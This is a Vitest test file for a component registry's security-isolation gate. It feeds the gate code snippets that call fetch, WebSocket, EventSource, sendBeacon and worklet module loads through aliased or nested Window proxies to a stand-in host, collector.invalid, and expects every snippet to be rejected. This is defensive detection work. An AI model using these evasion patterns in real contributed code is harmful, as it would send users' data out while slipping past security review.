import { describe, expect, it } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { checkSecurityIsolationGate } from '../checks/isolation-check.js';
import { runRegistryGate } from '../index.js';

describe('registry gate nested Window proxy network references', () => {
  it('rejects outbound requests through nested Window proxies and aliases', () => {
    const sources = [
      `const request = window.window.fetch; request('https://collector.invalid/data');`,
      `const request = globalThis.window.fetch; request('https://collector.invalid/data');`,
      `const request = window.parent.window.fetch; request('https://collector.invalid/data');`,
      `const request = window.frames.fetch; request('https://collector.invalid/data');`,
      `const request = globalThis.frames.fetch; request('https://collector.invalid/data');`,
      `const request = window.opener.fetch; request('https://collector.invalid/data');`,
      `const request = globalThis.opener.fetch; request('https://collector.invalid/data');`,
      `const request = document.defaultView.fetch; request('https://collector.invalid/data');`,
      `const request = globalThis.document.defaultView.fetch; request('https://collector.invalid/data');`,
      `const request = window.document.defaultView.fetch; request('https://collector.invalid/data');`,
      `const { window: browserWindow } = globalThis; const request = browserWindow.fetch; request('https://collector.invalid/data');`,
      `const { frames: frameProxy } = globalThis; const request = frameProxy.fetch; request('https://collector.invalid/data');`,
      `const { defaultView: activeWindow } = document; const request = activeWindow.fetch; request('https://collector.invalid/data');`,
      `let browserWindow; browserWindow = globalThis.window; const request = browserWindow.fetch; request('https://collector.invalid/data');`,
      `let browserWindow; ({ window: browserWindow } = globalThis); const request = browserWindow.fetch; request('https://collector.invalid/data');`,
      `let activeWindow; ({ defaultView: activeWindow } = document); const request = activeWindow.fetch; request('https://collector.invalid/data');`,
      `function requestFromWindow(browserWindow: Window) { browserWindow.fetch('https://collector.invalid/data'); } requestFromWindow(globalThis);`,
      `const forward = (request: typeof fetch) => request('https://collector.invalid/data'); forward(globalThis.fetch);`,
      `const connect = (Socket: typeof WebSocket) => new Socket('wss://collector.invalid/socket'); connect(globalThis.WebSocket);`,
      `const request = (Client: typeof XMLHttpRequest) => new Client(); request(globalThis.XMLHttpRequest);`,
      `const stream = (Feed: typeof EventSource) => new Feed('https://collector.invalid/events'); stream(globalThis.EventSource);`,
      `const beacon = (send: typeof navigator.sendBeacon) => send('https://collector.invalid/pixel', 'x'); beacon(navigator.sendBeacon);`,
      `const forward = (request: typeof fetch) => request('https://collector.invalid/data'); forward(fetch);`,
    ];

    for (const source of sources) {
      expect(checkSecurityIsolationGate(source).status, source).toBe('fail');
    }
  });

  it('rejects external worklet module loads', () => {
    const sources = [
      `const context = new AudioContext(); context.audioWorklet.addModule('https://collector.invalid/processor.js');`,
      `CSS.paintWorklet.addModule('https://collector.invalid/paint.js');`,
      `const worklet = CSS.paintWorklet; worklet.addModule(moduleUrl);`,
      `const worklet = CSS.paintWorklet; worklet[getModuleMethod()]('/paint.js');`,
      `const worklet = CSS.paintWorklet; Reflect.get(worklet, getModuleMethod())('/paint.js');`,
      `const worklet = CSS.paintWorklet; Reflect.get(worklet, 'addModule')('/paint.js');`,
      `const { paintWorklet: worklet } = CSS; worklet[getModuleMethod()]('/paint.js');`,
      `let worklet; worklet = CSS.paintWorklet; worklet[getModuleMethod()]('/paint.js');`,
      `function load(worklet: Worklet) { worklet[getModuleMethod()]('/paint.js'); }`,
    ];

    for (const source of sources) {
      expect(checkSecurityIsolationGate(source).status, source).toBe('fail');
    }
  });

  it('rejects worklet module loads through the complete contribution gate', async () => {
    const repoRoot = path.resolve(__dirname, '../../../..');
    const canonicalButton = path.join(repoRoot, 'resources/primitives/button');
    const temporaryResource = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-worklet-module-'));

    try {
      fs.copyFileSync(
        path.join(canonicalButton, 'manifest.json'),
        path.join(temporaryResource, 'manifest.json')
      );
      const sources = [
        `const context = new AudioContext(); context.audioWorklet.addModule('https://collector.invalid/processor.js');`,
        `CSS.paintWorklet.addModule('https://collector.invalid/paint.js');`,
        `const worklet = CSS.paintWorklet; worklet[getModuleMethod()]('/paint.js');`,
        `const worklet = CSS.paintWorklet; Reflect.get(worklet, 'addModule')('/paint.js');`,
        `const { paintWorklet: worklet } = CSS; worklet[getModuleMethod()]('/paint.js');`,
      ];

      for (const source of sources) {
        fs.writeFileSync(path.join(temporaryResource, 'index.tsx'), source, 'utf8');
        const report = await runRegistryGate(temporaryResource);
        const isolation = report.checks.find((check) => check.id === 'security-isolation');

        expect(isolation?.status, source).toBe('fail');
        expect(isolation?.details, source).toMatch(/outbound|network|cannot be certified/i);
        expect(report.overallStatus, source).toBe('rejected');
      }
    } finally {
      fs.rmSync(temporaryResource, { recursive: true, force: true });
    }
  });

  it('rejects the same source through the complete contribution gate', async () => {
    const repoRoot = path.resolve(__dirname, '../../../..');
    const canonicalButton = path.join(repoRoot, 'resources/primitives/button');
    const temporaryResource = fs.mkdtempSync(path.join(os.tmpdir(), 'tess-gate-window-proxy-'));

    try {
      fs.copyFileSync(
        path.join(canonicalButton, 'manifest.json'),
        path.join(temporaryResource, 'manifest.json')
      );
      const sources = [
        `const request = window.window.fetch; request('https://collector.invalid/data');`,
        `const { window: browserWindow } = globalThis; const request = browserWindow.fetch; request('https://collector.invalid/data');`,
        `let browserWindow; browserWindow = globalThis.window; const request = browserWindow.fetch; request('https://collector.invalid/data');`,
        `let browserWindow; ({ window: browserWindow } = globalThis); const request = browserWindow.fetch; request('https://collector.invalid/data');`,
        `let activeWindow; ({ defaultView: activeWindow } = document); const request = activeWindow.fetch; request('https://collector.invalid/data');`,
        `const forward = (request: typeof fetch) => request('https://collector.invalid/data'); forward(globalThis.fetch);`,
        `const connect = (Socket: typeof WebSocket) => new Socket('wss://collector.invalid/socket'); connect(globalThis.WebSocket);`,
        `const request = (Client: typeof XMLHttpRequest) => new Client(); request(globalThis.XMLHttpRequest);`,
        `const stream = (Feed: typeof EventSource) => new Feed('https://collector.invalid/events'); stream(globalThis.EventSource);`,
        `const beacon = (send: typeof navigator.sendBeacon) => send('https://collector.invalid/pixel', 'x'); beacon(navigator.sendBeacon);`,
        `const forward = (request: typeof fetch) => request('https://collector.invalid/data'); forward(fetch);`,
      ];

      for (const source of sources) {
        fs.writeFileSync(path.join(temporaryResource, 'index.tsx'), source, 'utf8');
        const report = await runRegistryGate(temporaryResource);
        const isolation = report.checks.find((check) => check.id === 'security-isolation');

        expect(isolation?.status, source).toBe('fail');
        expect(isolation?.details, source).toMatch(/outbound|network/i);
        expect(report.overallStatus, source).toBe('rejected');
      }
    } finally {
      fs.rmSync(temporaryResource, { recursive: true, force: true });
    }
  });
});
